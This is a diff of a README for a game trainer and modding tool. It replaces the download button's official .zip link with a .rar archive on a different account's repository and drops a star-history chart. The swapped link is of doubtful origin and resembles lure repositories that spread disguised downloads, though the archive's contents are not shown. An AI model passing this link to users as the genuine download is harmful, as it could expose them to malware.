@@ -15,7 +15,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/EliteModder/DragonSword-OmniTool/releases/latest/download/DragonSwordOmniTool.zip">
+  <a href="https://github.com/andreylee-x04z3/DragonSword-Awakening-Trainer-Pro/releases/download/DragonSword/DragonSwordTrainer.rar">
     <img src="https://raw.githubusercontent.com/andreylee-x04z3/DragonSword-Awakening-Trainer-Pro/refs/heads/main/DragonSword-Awakening-OmniTool.png" width="100%" alt="Download DragonSword OmniTool">
   </a>
 </p>
@@ -172,8 +172,6 @@ OmniTool supports **drag-and-drop mods**:
 ![GitHub watchers](https://img.shields.io/github/watchers/EliteModder/DragonSword-OmniTool?style=social)
 ![GitHub contributors](https://img.shields.io/github/contributors/EliteModder/DragonSword-OmniTool)
 ![GitHub last commit](https://img.shields.io/github/last-commit/EliteModder/DragonSword-OmniTool)
-
-[![Star History Chart](https://api.star-history.com/svg?repos=EliteModder/DragonSword-OmniTool&type=Date)](https://star-history.com/#EliteModder/DragonSword-OmniTool&Date)
 
 
 
